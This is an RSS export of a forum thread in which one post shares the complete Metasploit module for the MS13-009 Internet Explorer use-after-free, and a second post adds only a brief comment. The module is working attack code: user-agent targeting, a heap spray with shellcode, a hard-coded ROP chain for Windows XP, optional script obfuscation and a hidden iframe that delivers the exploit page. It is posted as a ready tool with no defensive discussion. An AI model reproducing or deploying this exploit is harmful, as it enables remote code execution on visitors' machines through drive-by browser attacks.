<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "exploit ms13-009 cho Metasploit"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/33.html</link>
		<description><![CDATA[Latest messages posted in the topic "exploit ms13-009 cho Metasploit"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>exploit ms13-009 cho Metasploit</title>
				<description><![CDATA[ ##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#  <span class="link"> http://metasploit.com/framework/</span>
##

require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::RopDb


	def initialize(info={})
		super(update_info(info,
			'Name'		  =&gt; &quot;Microsoft Internet Explorer SLayoutRun Use-After-Free&quot;,
			'Description'	  =&gt; %q{
				This module exploits a use-after-free vulnerability in Microsoft Internet Explorer
				where a CParaElement node is released but a reference is still kept
				in CDoc. This memory is reused when a CDoc relayout is performed.
			},
			'License'	  =&gt; MSF_LICENSE,
			'Author'	  =&gt;
				[
					'Scott Bell &lt;scott.bell@security-assessment.com&gt;',  # Vulnerability discovery & Metasploit module
				],
			'References'	  =&gt;
				[
					[ 'CVE', '2013-0025' ],
					[ 'MSB', 'MS13-009' ],
					[ 'URL', 'http://security-assessment.com/files/documents/advisory/ie_slayoutrun_uaf.pdf' ],
				],
			'Payload'	  =&gt;
				{
					'BadChars'		=&gt; &quot;\x00&quot;,
					'Space'			=&gt; 1024,
					'DisableNops'		=&gt; true,
					'PrependEncoder'	=&gt; &quot;\x81\xc4\x54\xf2\xff\xff&quot;,
				},
			'DefaultOptions'  =&gt;
				{
					'InitialAutoRunScript' =&gt; 'migrate -f'
				},
			'Platform'	  =&gt; 'win',
			'Targets'	  =&gt;
				[
					[ 'Automatic', {} ],
					[ 'IE 8 on Windows XP SP3', { 'Rop' =&gt; :msvcrt, 'Offset' =&gt; 0x5f4 } ]
				],
			'Privileged'	  =&gt; false,
			'DisclosureDate'  =&gt; &quot;Feb 13 2013&quot;,
			'DefaultTarget'   =&gt; 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)

	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
		ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

		ie_name = &quot;IE #{ie}&quot;

		case nt
		when '5.1'
			os_name = 'Windows XP SP3'
		end

		targets.each do |t|
			if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
				print_status(&quot;Target selected as: #{t.name}&quot;)
				return t
			end
		end

		return nil
	end

	def heap_spray(my_target, p)
		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
		js_nops = Rex::Text.to_unescape(&quot;\x0c&quot;*4, Rex::Arch.endian(target.arch))

		js = %Q|

			var heap_obj = new heapLib.ie(0x20000);
			var code = unescape(&quot;#{js_code}&quot;);
			var nops = unescape(&quot;#{js_nops}&quot;);
			while (nops.length &lt; 0x80000) nops += nops;
			var offset = nops.substring(0, #{my_target['Offset']});
			var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
			while (shellcode.length &lt; 0x40000) shellcode += shellcode;
			var block = shellcode.substring(0, (0x80000-6)/2);
			heap_obj.gc();
			for (var i=1; i &lt; 0x300; i++) {
				heap_obj.alloc(block);
			}
			var overflow = nops.substring(0, 10);

		|

		js = heaplib(js, {:noobfu =&gt; true})

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate

		end

		return js
	end

	def get_payload(t, cli)
		code = payload.encoded

		# No rop. Just return the payload.
		return code if t['Rop'].nil?

		# ROP chain generated by mona.py - See corelan.be
		case t['Rop']
		when :msvcrt
			print_status(&quot;Using msvcrt ROP&quot;)
			rop_nops = [0x77c39f92].pack(&quot;V&quot;) * 11 # RETN
			rop_payload = generate_rop_payload('msvcrt', &quot;&quot;, {'target'=&gt;'xp'})
			rop_payload &lt;&lt; rop_nops
			rop_payload &lt;&lt; [0x77c364d5].pack(&quot;V&quot;) # POP EBP # RETN
			rop_payload &lt;&lt; [0x77c15ed5].pack(&quot;V&quot;) # XCHG EAX, ESP # RETN
			rop_payload &lt;&lt; [0x77c35459].pack(&quot;V&quot;) # PUSH ESP # RETN
			rop_payload &lt;&lt; [0x77c39f92].pack(&quot;V&quot;) # RETN
			rop_payload &lt;&lt; [0x0c0c0c8c].pack(&quot;V&quot;) # Shellcode offset
			rop_payload &lt;&lt; code

		end

		return rop_payload
	end

	def this_resource
		r = get_resource
		return ( r == '/') ? '' : r
	end

	def get_exploit(my_target, cli)
		p  = get_payload(my_target, cli)
		js = heap_spray(my_target, p)


		html = %Q|
		&lt;!doctype html&gt;
		&lt;html&gt;
		&lt;head&gt;
		&lt;script&gt;
		var data
		var objArray = new Array(1800);
		#{js}

		setTimeout(function(){
			for (var i=0;i&lt;objArray.length;i++){
				objArray[i] = document.createElement('body');
				document.body.appendChild(objArray[i])
				objArray[i].style.display = "none"
			}

			document.body.style.whiteSpace = "pre-line"

			for(var i=0;i&lt;10;i++){
				for (var i=0;i&lt;(objArray.length-650);i++){
					objArray[i].className = data += unescape("%u0c0c%u0c0c");
				}
			}

			setTimeout(function(){document.body.innerHTML = "boo"}, 100)
		}, 100)

		&gt;&lt;/script&gt;
		&lt;/head&gt;
		&lt;body&gt;
		&lt;p&gt; &lt;/p&gt;
		&lt;/body&gt;
		&lt;/html&gt;
		|

		return html
	end


	def get_iframe
		html = %Q|
		&lt;html&gt;
		&lt;body&gt;
		&lt;iframe src="#{this_resource}/#{@iframe_name}" height="1" width="1"&gt;&lt;/iframe&gt;
		&lt;/body&gt;
		&lt;/html&gt;
		|

		return html
	end


	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		uri   = request.uri
		print_status(&quot;Requesting: #{uri}&quot;)

		my_target = get_target(agent)
		# Avoid the attack if no suitable target found
		if my_target.nil?
			print_error(&quot;Browser not supported, sending 404: #{agent}&quot;)
			send_not_found(cli)
			return
		end


		if uri =~ /#{@iframe_name}/
			html = get_exploit(my_target, cli)
			html = html.gsub(/^\t\t/, '')
			print_status(&quot;Sending HTML...&quot;)
		elsif	uri=~ /\/$/
			html = get_iframe
			print_status &quot;Sending IFRAME...&quot;
		end
			send_response(cli, html, {'Content-Type'=&gt;'text/html'})


	end

	def exploit
		@iframe_name = &quot;#{Rex::Text.rand_text_alpha(5)}.html&quot;
		super
	end
end]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/44342.html#273813</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/44342.html#273813</link>
				<pubDate><![CDATA[Sat, 2 Mar 2013 09:24:25]]> GMT</pubDate>
				<author><![CDATA[ crazykid]]></author>
			</item>
			<item>
				<title>exploit ms13-009 cho Metasploit</title>
				<description><![CDATA[ no comment :D ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/44342.html#273814</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/44342.html#273814</link>
				<pubDate><![CDATA[Sat, 2 Mar 2013 09:29:10]]> GMT</pubDate>
				<author><![CDATA[ phuongnvt]]></author>
			</item>
	</channel>
</rss>
